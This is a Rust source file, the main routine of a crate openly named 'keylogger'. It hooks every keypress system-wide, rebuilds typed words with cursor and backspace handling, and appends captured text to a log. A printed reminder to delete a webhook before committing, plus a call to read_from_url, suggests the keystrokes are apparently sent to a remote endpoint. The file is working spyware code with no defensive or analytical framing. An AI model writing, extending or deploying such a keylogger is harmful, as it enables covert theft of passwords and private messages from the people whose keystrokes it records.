use keylogger::*;
use rdev::{EventType, Key};
use std::{sync::mpsc, time::Instant};

fn main() -> Result<(), Box<rdev::ListenError>> {
    println!("MAKE SURE TO DELETE THE WEBHOOK BEFORE COMITTING.");
    read_from_url();
    let mut sentence = String::new();
    let mut current_word_buf: Vec<String> = Vec::new();
    let mut cursor_pos = 0;

    let (tx, rx) = mpsc::channel::<Instant>();
    let (mod_send, mod_recv) = mpsc::channel::<Instant>();

    rdev::listen(move |event| {
        let ctrl_held = timer_done(&rx, TIMEOUT);
        let modkey_held = timer_done(&mod_recv, TIMEOUT);

        if let EventType::KeyPress(key) = event.event_type {
            if MODIFIER_KEYS.contains(&key) {
                start_timer(mod_send.clone()).unwrap();
            } else {
                match key {
                    Key::ControlLeft | Key::ControlRight => {
                        start_timer(tx.clone()).unwrap();
                    }
                    Key::Return => {
                        if current_word_buf.len() >= 5 {
                            match current_word_buf.append_to_log() {
                                Ok(_) => (),
                                Err(err) => {
                                    eprintln!("{}", err);
                                },
                            }
                            current_word_buf.clear();
                            cursor_pos = 0;
                        } else {
                            current_word_buf.clear();
                            cursor_pos = 0;
                        }
                    }
                    Key::Space => {
                        if !GET_SENTENCES {
                            sentence.push_str(
                                &current_word_buf
                                    .iter()
                                    .map(|s| s.clone())
                                    .collect::<String>(),
                            );
                            current_word_buf.clear();
                            cursor_pos = 0;
                        } else {
                            handle_key(
                                Some(" ".to_string()),
                                ctrl_held,
                                modkey_held,
                                &mut cursor_pos,
                                &mut current_word_buf,
                            );
                        }
                    }
                    Key::RightArrow => {
                        if cursor_pos < current_word_buf.len() {
                            cursor_pos += 1;
                        }
                    }
                    Key::LeftArrow => {
                        if ctrl_held && cursor_pos >= 1 {
                            cursor_pos = 0;
                        } else if cursor_pos >= 1 {
                            cursor_pos -= 1;
                        }
                    }

                    Key::UpArrow => {
                        current_word_buf.clear();
                        cursor_pos = 0;
                    }

                    Key::DownArrow => {
                        current_word_buf.clear();
                        cursor_pos = 0;
                    }
                    Key::Delete => {}
                    Key::Backspace => {
                        /*                         if GET_SENTENCES {
                        } else { */

                        if ctrl_held {
                            current_word_buf.drain(0..cursor_pos);
                            cursor_pos = 0;
                        } else if !current_word_buf.is_empty()
                            && current_word_buf.get(cursor_pos) != Some(&current_word_buf[0])
                            && cursor_pos >= 1
                        {
                            current_word_buf.remove(cursor_pos - 1);
                            cursor_pos -= 1;
                        }
                    }

                    _ => {
                        let event = event.name;
                        handle_key(
                            event,
                            ctrl_held,
                            modkey_held,
                            &mut cursor_pos,
                            &mut current_word_buf,
                        )
                    }
                }
            }
        }
    })?;

    Ok(())
}
